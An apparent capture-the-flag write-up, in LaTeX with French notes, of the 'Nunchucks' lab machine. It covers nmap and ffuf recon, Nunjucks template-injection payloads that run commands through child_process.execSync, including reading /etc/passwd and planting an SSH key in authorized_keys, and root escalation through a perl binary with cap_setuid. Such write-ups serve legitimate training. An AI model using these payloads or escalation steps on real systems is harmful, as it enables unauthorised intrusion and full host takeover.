\chapter{Nunchucks}
\begin{itemize}
    \item {\bf technics}: 
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}


\section{Résumé}


\section{Details}

\subsection{Recon}
\subsubsection{nmap}
\begin{verbatim}
TARGET_IP=10.10.11.122
$ PORTS=$( sudo nmap --min-rate=1000 -T4 -p- $TARGET_IP | grep '^[0-9]' | 
    cut -d'/' -f 1 | tr '\n' ',' | sed s/',$'//)
$ sudo nmap -sVC -p$PORTS $TARGET_IP

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 (RSA)
|   256 a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 (ECDSA)
|_  256 e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://nunchucks.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-title: Nunchucks - Landing Page
| tls-nextprotoneg: 
|_  http/1.1
| ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK
| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
| Not valid before: 2021-08-30T15:42:24
|_Not valid after:  2031-08-28T15:42:24
| tls-alpn: 
|_  http/1.1
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

\end{verbatim}

\subsubsection{http}

on a des noms \ldots

\begin{verbatim}
$ ffuf -u https://nunchucks.htb/FUZZ 
    -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -fs 45

login                   [Status: 200, Size: 9172, Words: 3129, Lines: 184, Duration: 29ms]
terms                   [Status: 200, Size: 17753, Words: 5558, Lines: 246, Duration: 33ms]
signup                  [Status: 200, Size: 9488, Words: 3266, Lines: 188, Duration: 33ms]
assets                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 33ms]
\end{verbatim}

\begin{verbatim}
$ ffuf -u https://10.10.11.122 -H 'Host: FUZZ.nunchucks.htb'  
    -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt 
    -fs 30589

store
\end{verbatim}


fuzzing store ne donne trop rien.

le seul truc que l'on a c'est un champ qui reflect. par contre il y a une
validation email.

\begin{verbatim}
POST /api/submit HTTP/1.1
Host: store.nunchucks.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://store.nunchucks.htb/
Content-Type: application/json
Content-Length: 19
Origin: https://store.nunchucks.htb
DNT: 1
Connection: keep-alive
Cookie: _csrf=mwBeWlqpSUn9ciBBSP2xNdxF
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Sec-GPC: 1

{"email":"a@a.com"}
\end{verbatim}

c'est un faux csrf.

\begin{verbatim}
 curl -k -X POST https://store.nunchucks.htb/api/submit -H @headers --data '{"email":"a@a.com"}'
{"response":"You will receive updates on the following email address: a@a.com."}

$ --data '{"email":"{{7*7}}"}'
{"response":"You will receive updates on the following email address: 49."}

avec un 
$ --data-urlencode '{"email":"{{7*7}}"}'
'{"email":"${7*7}"}'
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>SyntaxError: Unexpected token % in JSON at position 0<br> &nbsp; &nbsp;at JSON.parse (&lt;anonymous&gt;)<br> &nbsp; &nbsp;at createStrictSyntaxError (/var/www/store.nunchucks/node_modules/body-parser/lib/types/json.js:158:10)<br> &nbsp; &nbsp;at parse (/var/www/store.nunchucks/node_modules/body-parser/lib/types/json.js:83:15)<br> &nbsp; &nbsp;at /var/www/store.nunchucks/node_modules/body-parser/lib/read.js:121:18<br> &nbsp; &nbsp;at invokeCallback (/var/www/store.nunchucks/node_modules/raw-body/index.js:224:16)<br> &nbsp; &nbsp;at done (/var/www/store.nunchucks/node_modules/raw-body/index.js:213:7)<br> &nbsp; &nbsp;at IncomingMessage.onEnd (/var/www/store.nunchucks/node_modules/raw-body/index.js:273:7)<br> &nbsp; &nbsp;at IncomingMessage.emit (events.js:203:15)<br> &nbsp; &nbsp;at endReadableNT (_stream_readable.js:1145:12)<br> &nbsp; &nbsp;at process._tickCallback (internal/process/next_tick.js:63:19)</pre>
</body>
</html>
\end{verbatim}
en testant ni jinja2 ni twig ne semble repondre.

Donc recherche des templates pour '\verb+Express.js+o
\url{https://expressjs.com/en/resources/template-engines.html} oh un truc qui
s'appel \verb+Nunjucks: Inspired by jinja/twig+.

\url{https://mozilla.github.io/nunjucks/templating.html}

ca pose le cadre :
\begin{verbatim}
nunjucks does not sandbox execution so it is not safe to run user-defined
templates or inject user-defined content into template definitions. On the
server, you can expose attack vectors for accessing sensitive data and remote
code execution. On the client, you can expose cross-site scripting
vulnerabilities even for precompiled templates (which can be mitigated with a
strong CSP). See this issue for more information.
\end{verbatim}


par contre vaiment très galere avec les quotes\ldots alors qu'avec burp ca
passe normal avec les \verb+\+

\url{http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine}

donc on peut faire du RCE 
\begin{verbatim}
{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('cat /etc/passwd')\")()}}
{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}
# pas de sshkey
\end{verbatim}

on va donc creer une clé ssh
\begin{verbatim}
"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDoMW2z/vnad3e5EiXtfsDzM9o4u1Dhwz4FGmTm47y/8e5dQ4sNSgcElnh69PCDegpcwU+D3db3gdNpNqID9ZC4MWhHxHi1JcEiPFq/SJp0cxRWbPU4ZpdHuymYS3vPcUj9aVNDmC+ZuE8awdmtssc5n0p4bMdIhiCdtv6jyqLnWNX1fk0+hsHWdmBxeHWKQq0sV/kQeqnKLb+iMeVTRTxxwBU5b7rLZ0ApnbrAvDOmDoOkOXv2yYY2cF4qEJm+o/R+5/W/BV5K6QEZ5MaRwudt6c72x4p7Jg+CttbqvMIdGFyengiPjKvZd+yZ0c3Mu7l6Ipca0JhyA0ikvIJtegNo7LW/WgogRRN+k3seNwOAs5uWv+rr6oq3j2qYjGhTeFsNL7yLH7cYh1YUNoIUoAApp43WiICtxGoJUx67iizykFYAOaYBMM5Ej56QBzC09+D603LLkptmu1uHCWJ12JIH+hsx18e/8VgYoRyVjT9t4QT4J7najWtRHKG0HwYhYaU= david@source    >  /home/david/.ssh/authorized_keys')\")()}}"
\end{verbatim}

\subsection{Foothold}
\subsubsection{david}
\begin{verbatim}
Files with capabilities (limited to 50):
/usr/bin/perl = cap_setuid+ep



######### Interesting GROUP writable files (not in Home) (max 500)
# https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
  Group david:
/opt/web_backups/backup_2021-09-26-1632618416.tar
/opt/web_backups/backup_2021-09-26-1632619104.tar

\end{verbatim}


\begin{verbatim}
~$ cat /opt/backup.pl
#!/usr/bin/perl
use strict;
use POSIX qw(strftime);
use DBI;
use POSIX qw(setuid);
POSIX::setuid(0);

my $tmpdir        = "/tmp";
my $backup_main = '/var/www';
my $now = strftime("%Y-%m-%d-%s", localtime);
my $tmpbdir = "$tmpdir/backup_$now";

sub printlog
{
    print "[", strftime("%D %T", localtime), "] $_[0]\n";
}

sub archive
{
    printlog "Archiving...";
    system("/usr/bin/tar -zcf $tmpbdir/backup_$now.tar $backup_main/* 2>/dev/null");
    printlog "Backup complete in $tmpbdir/backup_$now.tar";
}

if ($> != 0) {
    die "You must run this script as root.\n";
}

printlog "Backup starts.";
mkdir($tmpbdir);
&archive;
printlog "Moving $tmpbdir/backup_$now to /opt/web_backups";
system("/usr/bin/mv $tmpbdir/backup_$now.tar /opt/web_backups/");
printlog "Removing temporary directory";
rmdir($tmpbdir);
printlog "Completed";
\end{verbatim}

donc visiblement le script est lancé par david car le fichier resultant est
\verb+root:david+ et que le script fait un \verb+setuid(0)+

en fait comme perl à le privilege,

on doit pouvoir creer un scrip qui \verb+setuid(0)+ et shell

\begin{verbatim}
#!/usr/bin/perl
use strict;
use POSIX qw(strftime);
use DBI;
use POSIX qw(setuid);
POSIX::setuid(0);

system("/usr/bin/bash");
\end{verbatim}

\begin{verbatim}
david@nunchucks:~$ ./shell.pl
root@nunchucks:~# id
uid=0(root) gid=1000(david) groups=1000(david)
\end{verbatim}
\subsubsection{x}
\section{Theorie}


